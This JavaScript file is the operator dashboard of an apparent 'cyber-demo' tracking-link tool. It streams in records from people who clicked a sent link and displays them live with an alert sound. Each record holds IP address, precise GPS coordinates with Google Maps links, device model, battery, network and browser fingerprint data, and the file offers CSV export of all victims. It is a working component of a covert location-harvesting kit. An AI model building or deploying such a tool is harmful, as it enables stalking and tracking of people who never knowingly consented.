// ═══════════════════════════════════════
//  SOCKET CONNECTION
// ═══════════════════════════════════════

const socket = io();
let allLocations = [];

socket.on('all-locations', (locations) => {
  allLocations = locations;
  renderDashboard();
});

socket.on('new-location', (location) => {
  allLocations.unshift(location);
  renderDashboard();
  playAlert();
});

// ═══════════════════════════════════════
//  SOUND ALERT
// ═══════════════════════════════════════

function playAlert() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.value = 880;
    osc.type = 'sine';
    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.5);
  } catch (e) {}
}

// ═══════════════════════════════════════
//  TIME FORMAT
// ═══════════════════════════════════════

function formatTime(iso) {
  return new Date(iso).toLocaleString('en-IN', {
    day:    '2-digit',
    month:  'short',
    year:   'numeric',
    hour:   '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
}

// ═══════════════════════════════════════
//  STATS UPDATE
// ═══════════════════════════════════════

function updateStats() {
  const total   = allLocations.length;
  const withLoc = allLocations.filter(l => !l.denied && l.lat != null).length;
  const denied  = allLocations.filter(l =>  l.denied || l.lat == null).length;

  // Mobile vs Desktop
  const mobile  = allLocations.filter(l =>
    l.device && l.device.includes('Mobile') ||
    l.device && l.device.includes('Phone') ||
    l.device && l.device.includes('iPhone') ||
    l.device && l.device.includes('iPad')
  ).length;

  document.getElementById('s-total').textContent  = total;
  document.getElementById('s-loc').textContent    = withLoc;
  document.getElementById('s-den').textContent    = denied;
  document.getElementById('s-mobile').textContent = mobile;
}

// ═══════════════════════════════════════
//  CSV EXPORT
// ═══════════════════════════════════════

function exportCSV() {
  if (allLocations.length === 0) {
    alert('Koi data nahi hai abhi!');
    return;
  }

  const headers = [
    'No', 'Timestamp', 'IP Address',
    'Latitude', 'Longitude', 'Accuracy', 'Altitude',
    'Device', 'Phone Model', 'OS', 'Browser',
    'Screen Size', 'Pixel Ratio', 'Color Depth', 'Orientation',
    'Network Type', 'Network Speed', 'Download', 'Latency',
    'Online Status', 'Battery', 'Charging',
    'CPU Cores', 'RAM', 'Touch Support',
    'Language', 'Timezone', 'Cookies', 'Do Not Track', 'Platform',
    'Location Denied'
  ];

  const rows = allLocations.map((l, i) => [
    allLocations.length - i,
    formatTime(l.timestamp),
    l.ip            || '—',
    l.lat           || '—',
    l.lng           || '—',
    l.accuracy      ? `±${l.accuracy}m` : '—',
    l.altitude      || '—',
    l.device        || '—',
    l.phoneModel    || '—',
    l.os            || '—',
    l.browser       || '—',
    l.screenSize    || '—',
    l.pixelRatio    || '—',
    l.colorDepth    || '—',
    l.orientation   || '—',
    l.networkType   || '—',
    l.networkSpeed  || '—',
    l.downlink      || '—',
    l.rtt           || '—',
    l.online        || '—',
    l.battery       || '—',
    l.charging      || '—',
    l.cpuCores      || '—',
    l.ram           || '—',
    l.touchSupport  || '—',
    l.language      || '—',
    l.timezone      || '—',
    l.cookiesEnabled|| '—',
    l.doNotTrack    || '—',
    l.platform      || '—',
    l.denied ? 'Yes' : 'No'
  ]);

  const csv = [headers, ...rows]
    .map(r => r.map(v => `"${v}"`).join(','))
    .join('\n');

  const blob = new Blob([csv], { type: 'text/csv' });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href     = url;
  a.download = `cyber-demo-${Date.now()}.csv`;
  a.click();
  URL.revokeObjectURL(url);
}

// ═══════════════════════════════════════
//  CLEAR DATA
// ═══════════════════════════════════════

function clearData() {
  if (confirm('Saara data clear karna hai?')) {
    allLocations = [];
    renderDashboard();
  }
}

// ═══════════════════════════════════════
//  RENDER DASHBOARD
// ═══════════════════════════════════════

function renderDashboard() {
  updateStats();

  const list = document.getElementById('locsList');

  if (allLocations.length === 0) {
    list.innerHTML = `
      <div class="empty-state">
        <span class="emp-icon">📡</span>
        <div class="emp-msg">Waiting for clicks...</div>
        <div class="emp-sub">Demo link bhejo aur click hone ka wait karo</div>
      </div>`;
    return;
  }

  list.innerHTML = allLocations.map((loc, i) => {
    const n       = allLocations.length - i;
    const hasLoc  = !loc.denied && loc.lat != null;
    const mapsUrl = hasLoc
      ? `https://www.google.com/maps?q=${loc.lat},${loc.lng}`
      : null;

    return `
      <div class="loc-card">

        <!-- ── Top Row ── -->
        <div class="lc-top">
          <div class="lc-num">${n}</div>
          <div class="lc-meta">
            <div class="lc-dev">
              ${loc.device || '💻 Device'} —
              ${loc.browser || '?'} /
              ${loc.os || '?'}
            </div>
            <div class="lc-time">${formatTime(loc.timestamp)}</div>
          </div>
          ${loc.denied ? '<span class="lc-deny">🚫 Denied</span>' : '<span class="lc-allow">✅ Allowed</span>'}
        </div>

        <!-- ── IP Address ── -->
        <div class="lc-ip">
          🌐 IP Address: <strong>${loc.ip || 'Unknown'}</strong>
        </div>

        <!-- ── Coordinates ── -->
        <div class="lc-coords">
          <span>
            ${hasLoc
              ? `<span class="lc-ll">
                   📍 ${parseFloat(loc.lat).toFixed(5)},
                   ${parseFloat(loc.lng).toFixed(5)}
                 </span>
                 <span class="lc-acc">±${loc.accuracy}m</span>`
              : `<span style="color:#f4a261">
                   🚫 Location permission denied
                 </span>`
            }
          </span>
          ${mapsUrl
            ? `<a href="${mapsUrl}" target="_blank" class="maps-link">
                 🗺️ Google Maps
               </a>`
            : ''
          }
        </div>

        <!-- ── Section: Device ── -->
        <div class="lc-section-title">📱 Device Info</div>
        <div class="lc-dets">
          <div class="lc-det">
            <div class="lc-dk">📱 Device</div>
            <div class="lc-dv">${loc.device || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">📲 Phone Model</div>
            <div class="lc-dv">${loc.phoneModel || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">💻 OS</div>
            <div class="lc-dv">${loc.os || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🌐 Browser</div>
            <div class="lc-dv">${loc.browser || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🖥️ Screen</div>
            <div class="lc-dv">${loc.screenSize || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🔲 Pixel Ratio</div>
            <div class="lc-dv">${loc.pixelRatio || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🎨 Color Depth</div>
            <div class="lc-dv">${loc.colorDepth || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">📐 Orientation</div>
            <div class="lc-dv">${loc.orientation || '—'}</div>
          </div>
        </div>

        <!-- ── Section: Network ── -->
        <div class="lc-section-title">📶 Network Info</div>
        <div class="lc-dets">
          <div class="lc-det">
            <div class="lc-dk">📶 Network Type</div>
            <div class="lc-dv">${loc.networkType || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">⚡ Speed</div>
            <div class="lc-dv">${loc.networkSpeed || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">📥 Download</div>
            <div class="lc-dv">${loc.downlink || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🏓 Latency</div>
            <div class="lc-dv">${loc.rtt || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🌐 Status</div>
            <div class="lc-dv">${loc.online || '—'}</div>
          </div>
        </div>

        <!-- ── Section: Battery & Hardware ── -->
        <div class="lc-section-title">🔋 Battery & Hardware</div>
        <div class="lc-dets">
          <div class="lc-det">
            <div class="lc-dk">🔋 Battery</div>
            <div class="lc-dv">${loc.battery || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">⚡ Charging</div>
            <div class="lc-dv">${loc.charging || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🧠 CPU Cores</div>
            <div class="lc-dv">${loc.cpuCores || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">💾 RAM</div>
            <div class="lc-dv">${loc.ram || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">👆 Touch</div>
            <div class="lc-dv">${loc.touchSupport || '—'}</div>
          </div>
          ${hasLoc ? `
          <div class="lc-det">
            <div class="lc-dk">🏔️ Altitude</div>
            <div class="lc-dv">${loc.altitude || '—'}</div>
          </div>` : ''}
        </div>

        <!-- ── Section: Browser Settings ── -->
        <div class="lc-section-title">⚙️ Browser Settings</div>
        <div class="lc-dets">
          <div class="lc-det">
            <div class="lc-dk">🌍 Language</div>
            <div class="lc-dv">${loc.language || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🕐 Timezone</div>
            <div class="lc-dv">${loc.timezone || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🍪 Cookies</div>
            <div class="lc-dv">${loc.cookiesEnabled || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">🚫 Do Not Track</div>
            <div class="lc-dv">${loc.doNotTrack || '—'}</div>
          </div>
          <div class="lc-det">
            <div class="lc-dk">💻 Platform</div>
            <div class="lc-dv">${loc.platform || '—'}</div>
          </div>
        </div>

      </div>`;
  }).join('');
}